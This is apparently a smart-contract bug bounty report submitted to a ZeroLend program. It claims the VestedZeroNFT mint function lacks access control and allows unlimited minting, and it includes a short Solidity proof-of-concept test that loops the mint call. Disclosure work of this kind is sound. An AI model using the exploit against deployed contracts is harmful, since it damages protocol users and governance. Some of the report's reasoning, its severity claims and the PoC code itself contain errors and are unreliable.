# 29130 - \[SC - Medium] Unlimited Minting of VestedZeroNFT

Submitted on Mar 7th 2024 at 23:55:31 UTC by @oxumarkhatab for [Boost | ZeroLend](https://immunefi.com/bounty/zerolend-boost/)

Report ID: #29130

Report type: Smart Contract

Report severity: Medium

Target: <https://github.com/zerolend/governance>

Impacts:

* Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

In current Implementation , the checks can easily be passed inside the public mint function because all the paramters are user controlled and there is no access control on that function.

## Vulnerability Details

The mint function does not have any access control implemented . Also there are checks which can easily be circumvented through careful crafting of those parameters and minting unlimited NFTs .

Take a look at this code

```
    function mint(
        address _who,
        uint256 _pending,
        uint256 _upfront,
        uint256 _linearDuration,
        uint256 _cliffDuration,
        uint256 _unlockDate,
        bool _hasPenalty,
        VestCategory _category
    ) external returns (uint256) {
        _mint(_who, ++lastTokenId);

        if (_unlockDate == 0) _unlockDate = block.timestamp;
        require(_unlockDate >= block.timestamp, "invalid _unlockDate");

        if (_hasPenalty) {
            require(_upfront == 0, "no upfront when there is a penalty");
            require(_cliffDuration == 0, "no cliff when there is a penalty");
        }

        tokenIdToLockDetails[lastTokenId] = LockDetails({
            cliffDuration: _cliffDuration,
            unlockDate: _unlockDate,
            pendingClaimed: 0,
            upfrontClaimed: 0,
            pending: _pending,
            hasPenalty: _hasPenalty,
            upfront: _upfront,
            linearDuration: _linearDuration,
            createdAt: block.timestamp,
            category: _category
        });

        // fund the contract
        zero.transferFrom(msg.sender, address(this), _pending + _upfront);

        return lastTokenId;
    }

```

First of all , there is no restriction to call this function so attacker can call and exploit it.

The function mints the latest ID NFT to the address passed , the attacker will pas his own address \` \_mint(\_who, ++lastTokenId);

\` Now attacker has to make this transaction success by avoiding require failures. here's how he can do it.

If user pass `_unlockDate` as 0 , then following checks will be passed \` if (\_unlockDate == 0) \_unlockDate = block.timestamp; require(\_unlockDate >= block.timestamp, "invalid \_unlockDate");

\`

Now for circumventing Plenty block, user will pass false

`if (_hasPenalty) { require(_upfront == 0, "no upfront when there is a penalty"); require(_cliffDuration == 0, "no cliff when there is a penalty"); }` a new Lock is created

`tokenIdToLockDetails[lastTokenId] = LockDetails({ cliffDuration: _cliffDuration, unlockDate: _unlockDate, pendingClaimed: 0, upfrontClaimed: 0, pending: _pending, hasPenalty: _hasPenalty, upfront: _upfront, linearDuration: _linearDuration, createdAt: block.timestamp, category: _category });`

And lastly some zeroToken needs to be moved from attacker's pocket to VestedZeroNFT contract . Which attacker can easily trick by passing pending and upfront amounts as 0 , \` zero.transferFrom(msg.sender, address(this), \_pending + \_upfront);

\` See the protocol does not use safeTransferFrom , rather transferFrom from openzeppelin standard as it imports as follows

\` import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";

\` Looking at OZs implementation , this function returns false on not sucess, so whatever amount we pass in as \_pending and \_upfront , the transfer might fail but transaction will not . That is the sweet spot for attacker.

`function transferFrom(address from, address to, uint256 value) external returns (bool);`

The Transaction is sucessfully executed and now the attacker has New NFT.

This process can be repeated for as long as attacker wants to print money out of thin air .

If Governance can be affected by amount of NFTs you have , Attacker has successfully gained the absolute power to screw the governance.

Hence this vulnerability is of critical importance.

## Impact Details

Attacker can have unlimited NFTs at the cost of just gas for transaction : )

If Governance can be affected by amount of NFTs you have , Attacker has successfully gained the absolute power to screw the governance.

Hence this vulnerability is of critical importance.

## References

See PoC for more details

## Proof of Concept

```solidity

event NewTokenIDMinted(uint);

    function test_InfiniteMint()public {
        address DEPLOYED_VESTED_ZERO_NFT_ADDRESS=address();
        address AttackerAddress=0x37A8d3c717ec8fDc8BD859627F18ce89c31E1E8b;
        VestedZeroNFT vest=new VestedZeroNFT();
        for (uint i = 0; i < 1000; i++) {
            
            uint newTokenId =vest.mint(
                    AttackerAddress,
                    0,
                    0,
                    0, // pass any suitable value 
                    0, // pass any suitable value 
                    0 ,// to  these checks  if (_unlockDate == 0) _unlockDate = block.timestamp; require(_unlockDate >= block.timestamp, "invalid _unlockDate");
                    false,
                    VestCategory.EARLY_ZERO


                );
                emit NewTokenIDMinted(newTokenId);
            
            }

    }
```
